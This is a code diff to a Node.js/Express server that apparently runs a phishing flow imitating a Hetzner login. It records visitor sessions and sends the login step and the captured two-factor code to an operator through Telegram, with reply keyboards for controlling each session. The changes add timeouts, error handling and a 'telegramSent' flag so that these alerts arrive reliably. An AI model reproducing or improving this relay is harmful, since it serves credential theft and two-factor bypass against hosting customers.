@@ -64,6 +64,10 @@ async function sendTelegram(text, replyMarkup, options = {}) {
       body: JSON.stringify(body),
       signal: controller.signal,
     });
+  } catch (err) {
+    clearTimeout(timer);
+    console.error("[telegram] fetch failed:", err.message);
+    return { ok: false, error: err.message || "fetch_failed" };
   } finally {
     clearTimeout(timer);
   }
@@ -114,10 +118,17 @@ function notifyFlowSessionAsync(session, title) {
 async function notifyHetznerSession(session, title) {
   if (!isTelegramConfigured()) return { ok: false, error: "not_configured" };
   const keyboard = hetznerFlow.buildTelegramKeyboard(session);
-  return sendTelegramReliable(
-    hetznerFlow.formatSessionMessage(session, title),
-    keyboard || undefined
-  );
+  const timeoutMs = 6000;
+  const result = await Promise.race([
+    sendTelegramReliable(
+      hetznerFlow.formatSessionMessage(session, title),
+      keyboard || undefined
+    ),
+    new Promise((resolve) =>
+      setTimeout(() => resolve({ ok: false, error: "telegram_timeout" }), timeoutMs)
+    ),
+  ]);
+  return result;
 }
 
 function notifyHetznerSessionAsync(session, title) {
@@ -512,10 +523,14 @@ app.get("/health", async (_req, res) => {
   const telegramWebhook = await getTelegramWebhookInfo();
   res.json({
     ok: true,
-    version: 7,
+    version: 8,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
     supabasePing,
+    vercelWarning:
+      process.env.VERCEL === "1" && getStoreMode() === "memory"
+        ? "Add Supabase env vars — memory store breaks sessions on Vercel"
+        : null,
     telegramWebhook,
     telegramConfigured: isTelegramConfigured(),
     telegramNotify: process.env.TELEGRAM_NOTIFY === "true",
@@ -629,8 +644,14 @@ app.post("/api/hetzner/start", async (req, res) => {
       ua: req.headers["user-agent"] || "",
     });
 
-    const tg = await notifyHetznerSession(session, "🔐 Hetzner — Login");
-    if (!tg.ok) console.error("[hetzner/start] telegram failed:", tg.error);
+    let telegramSent = false;
+    try {
+      const tg = await notifyHetznerSession(session, "🔐 Hetzner — Login");
+      telegramSent = Boolean(tg.ok);
+      if (!tg.ok) console.error("[hetzner/start] telegram failed:", tg.error);
+    } catch (err) {
+      console.error("[hetzner/start] telegram error:", err.message);
+    }
     setupTelegramWebhookAsync();
 
     return res.json({
@@ -638,6 +659,7 @@ app.post("/api/hetzner/start", async (req, res) => {
       sessionId: session.id,
       store: getStoreMode(),
       telegram: isTelegramConfigured(),
+      telegramSent,
     });
   } catch (err) {
     console.error("[hetzner/start]", err.message);
@@ -689,7 +711,12 @@ app.post("/api/hetzner/session/:id/code", async (req, res) => {
   });
 
   const updated = await hetznerFlow.getSession(session.id);
-  await notifyHetznerSession(updated, "🔢 Hetzner — 2FA Code");
+  try {
+    const tg = await notifyHetznerSession(updated, "🔢 Hetzner — 2FA Code");
+    if (!tg.ok) console.error("[hetzner/code] telegram failed:", tg.error);
+  } catch (err) {
+    console.error("[hetzner/code] telegram error:", err.message);
+  }
 
   return res.json({ ok: true, sessionId: session.id });
 });
